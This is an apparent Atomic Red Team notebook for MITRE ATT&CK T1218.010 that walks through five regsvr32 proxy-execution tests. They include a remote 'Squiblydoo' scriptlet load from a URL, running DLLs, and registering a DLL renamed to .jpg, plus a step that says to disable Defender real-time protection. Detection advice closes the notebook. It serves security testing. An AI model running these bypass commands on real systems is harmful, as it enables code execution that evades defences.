{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e710d785",
   "metadata": {},
   "source": "# T1218.010 - Regsvr32\nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)"
  },
  {
   "cell_type": "markdown",
   "id": "6ed6e3ea",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "62b0b36d",
   "metadata": {},
   "source": "### Atomic Test #1 - Regsvr32 local COM scriptlet execution\nRegsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Regsvr32.sct must exist on disk at specified location (#{filename})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct\" -OutFile \"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b6b61ae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e3eace3e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\system32\\regsvr32.exe /s /u /i:\"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f589228",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a41dab93",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Regsvr32 remote COM scriptlet execution",
    "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0fc02b1a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "8540243e",
   "metadata": {},
   "source": "### Atomic Test #3 - Regsvr32 local DLL execution\nRegsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52225b7c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "048b56e0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nIF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll )\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d68902f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "cb582a20",
   "metadata": {},
   "source": "### Atomic Test #4 - Regsvr32 Registering Non DLL\nReplicating observed Gozi maldoc behavior registering a dll with an altered extension\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Test requires a renamed dll file\n\n##### Check Prereq Commands:\n```cmd\nif exist %temp%\\shell32.jpg ( exit 0 ) else ( exit 1 )\n\n```\n##### Get Prereq Commands:\n```cmd\ncopy \"C:\\Windows\\System32\\shell32.dll\" \"%temp%\\shell32.jpg\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf7a9cf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "99e1d323",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f78c164d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "44e619a3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nC:\\Windows\\system32\\regsvr32.exe /U /s %temp%\\shell32.jpg\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "531d37fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3d0cdb8e",
   "metadata": {},
   "source": "### Atomic Test #5 - Regsvr32 Silent DLL Install Call DllRegisterServer\nRegsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b35e510a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "78c16c1a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\system32\\regsvr32.exe /s /i \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "76e2017b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.010 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "b4f6cec1",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}